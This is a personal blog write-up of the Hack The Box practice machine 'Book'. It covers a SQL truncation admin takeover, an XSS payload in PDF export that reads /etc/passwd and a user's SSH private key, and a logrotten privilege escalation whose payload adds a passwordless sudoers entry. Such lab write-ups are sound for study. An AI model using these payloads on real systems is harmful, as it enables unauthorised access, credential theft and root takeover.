Another few weeks flew by and I didn't find much to write, other than HTB write-ups. A few things did happen, such as the Singapore 2020 General Elections and the ongoing Covid19 happenings but I really don't find any good reason to air my views..if anyone's even looking ^^;. Anyway, this time Book has retired, and that gives me an opportunity to write. So here goes :)

### Recce
Doing the usual nmap scan reveals a few services, but none more interesting than the good-ol' port 80.
```
kali@kali:~/htb/boxes/book/nmap$ cat initial.txt

### Port 80
Visit port 80 and you find yourself confronted by the login page. Sign up with anything you choose, and see that it works.

```

Look around, scan it with nikto, do your directory-busting thing and you probably still wouldn't find a way forward. The box is written on a custom PHP application and does not seem to have any opportunities for SQL injection or other sort of injection vulnerabilities, at least while logged in as a normal user. 
  
  
You might however have noticed in your directory-busting thing that there's an `/admin` directory on the box:
```

Visit the `admin` directory, and be confronted with a login page that looks exactly like the login / signup page that you first encountered. Try some SQL injection, and see that it utterly doesn't work. Simply trying to trigger an SQL error doesn't give you anything to bite at - the app just quickly returns a `Nope!` message. However, if you had taken a proper look around while in your user account earlier, you would've noticed on the `Contact Us` page that there's an email address linked to the admin: `admin@book.htb`, which would've given us a username to work with if say we wanted to brute-force the `/admin` login page.

### SQL Truncation
Try to brute-force, however, and you still wouldn't make much progress - other than that brute-forcing ain't gonna work. It's at this point that we have to use our powers of observation and notice that, _simply because_ the initial login / sign-up page looks very similar to the `/admin` login page, perhaps there's a vulnerability we can exploit that links the two together.
  
  
As it turns out, there exists a vulnerability that links a sign-up function with a login function - SQL Truncation attacks. These work by abusing an mis-configured MySQL database that doesn't have "STRICT_TRANS_TABLE” enabled, where enabling it would prevent new data from overflowing a column past its established length limit (e.g. a column that expects VARCHAR(20) would have a limit of 20 characters). The danger of not preventing the overflowing of a column is that MySQL will automatically truncate overly-long data back within the length limit.

Now it turns out that the truncation alone wouldn't have caused a vulnerability. As it happens, web applications usually trim whitespaces from strings before analyzing them, and so if the retrieved data contains whitespaces at the trailing end, then the trimmed data will simply be the data minus the whitespaces. Please, [watch ippsec's awesome explanation on this.](https://youtu.be/RBtN5939m3g?t=5250)
  
  
Meaning for example, a string like `password               ` with the trailing whitespace will be saved as `password` after MySQL has truncated the whitespaces, where the truncation is activated when the original string exceeds the length limit.
  
  
So now that we know all this, we can use it to attack the box! Note also that when you signed up earlier, you should've noticed that there's a weak client-side validation against length limits on the box:
```
  }
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
```
Notice that only a JavaScript `alert` is given, and if you tried to login with a long email or username, the application would've accepted it. Notice that the limit for the `email` field is 20 characters - so that's the length limit we need to exceed to trigger SQL truncation. 
  
  
So, since we know the admin username (`admin@book.htb`), we can perform SQL truncation attack to insert another entry into the database by registering `admin@book.htb` with another password of our own, so that when the SQL query is performed for authentication on the backend, the search for `admin@book.htb` will qualify with our password.
  
  
To do this, sign up with the following:
``
username: admin@book.htb++++++++++++++++++wow
password: wow
``
In Burp:
```
name=wow&email=admin%40book.htb++++++++++++++++++wow&password=wow
```
This request should succeed, then now try to login at `/admin` with `admin@book.htb` and `wow`. This should work and you can now login as `admin` :)

### Local file read via XSS
Look around for the usual vulnerabilities, and if you eventually suspect the export PDF function as the most exploitable thing on the application, you're correct :)
  
  
The first thing we see is that whatever we submit as a normal user at `/collections.php` in the `Book Title` and `Author` fields will get reflected when we export the `Collections` PDF as an admin user at the admin version of `/collections.php` page. I had first wasted >5 hours trying to get a [local file read via iframe-injections](https://securityonline.info/export-injection-new-server-side-vulnerability/), before stumbling upon the right approach which was to do the same local file read [but via XSS instead](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html).
  
  
Anyhow, visit the link for local file read via XSS and inject the poc into either the `Book Title` or `Author` field at the user version of the `/collections.php` page:
```
<pre><script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script></pre>
```
On the admin side of `/collections.php`, export the Collections PDF and you should see the contents of `/etc/passwd` in the PDF! Like magic, yes?? Notice that there's a user called `reader` with the home directory at `/home/reader`, and also notice that this user is allowed to login with `/bin/bash`. Remember that port 22 (SSH) was open on this machine, so all things considered, logically speaking there should be an SSH key in `reader`'s home directory in order to allow `reader` to SSH to the box. So, let's tweaking our poc a little to extract the private SSH key from `reader`'s home directory:
```
<pre><script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText.fontsize(1))
};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script></pre>
```
Inject again into either the `Book Title` or `Author` field on the user side, go to the admin side and export the PDF, and now you should see `reader`'s SSH key in its entirety! Notice that we included a `fontsize(1)` in our XSS payload in order to fit the entire SSH key in the PDF.
  
### Shell as reader  
Copy out the SSH key, save it into a file like `reader.pem` and SSH into the box as `reader`. Grab user text here :).
### Priv via logrotten
Run a `linpeas.sh` and you should see the script pointing out `logrotten` as a potential privesc vector.

Writable: /home/reader/backups/access.log.1                                                                                                             
Writable: /home/reader/backups/access.log
```
[Follow the link](https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation) or [follow the `logrotten` Github page to see how this works](https://github.com/whotwagner/logrotten).
  
  
Basically to get it to work, we need a root-owned `logrotate` process that will perform a log rotation in a directory that's writable by our normal user. Both conditions are fulfilled for us -> so all we need to do is to upload `logrotten` to the box and execute it with the following payload:
```
echo "if [ `id -u` -eq 0 ]; then (echo 'reader  ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers &); fi" > payloadfile
```
This payload would add our `reader` account as a sudoer without requiring a password, which would allow us to `su` to root.
  
  
To summarize ->
Step 1: Compiled `logrotten` and upload to the box - this should self-explanatory.
Step 2: Construct our payload as mentioned above: 
```
echo "if [ `id -u` -eq 0 ]; then (echo 'reader  ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers &); fi" > payloadfile
```
Step 3: Setup `logrotten` to lay in wait...
```
reader@book:~$ ./logrotten -p ./payloadfile /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...
```
Step 4: Activate the log rotation through a second SSH session:
```
reader@book:~$ echo "wow" >> ~/backups/access.log
```
Step 5: Not really a step, but should see that `logrotten` caught the change:
```
reader@book:~$ ./logrotten -p ./payloadfile /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```
Step 6: Wait for root to login (the box has actually configured root to login)...
```
reader@book:~$ sudo -l
Matching Defaults entries for reader on book:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User reader may run the following commands on book:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```
Step 7: su to root :)
```
reader@book:~$ sudo su
root@book:/home/reader# id
uid=0(root) gid=0(root) groups=0(root) 
```

...it took me until re-doing the box while writing this post to realize the box has actually configured root to login. I had previously spent >5 hours just trying to activate bash_completion.d by SSH-ing in as `reader` (which was confirmed to have run the bash_completion.d), but it was only today when I wrote this post was that we had to have _root_ login to get bash_completion run with root privileges. Welp, learning something new every day. :)
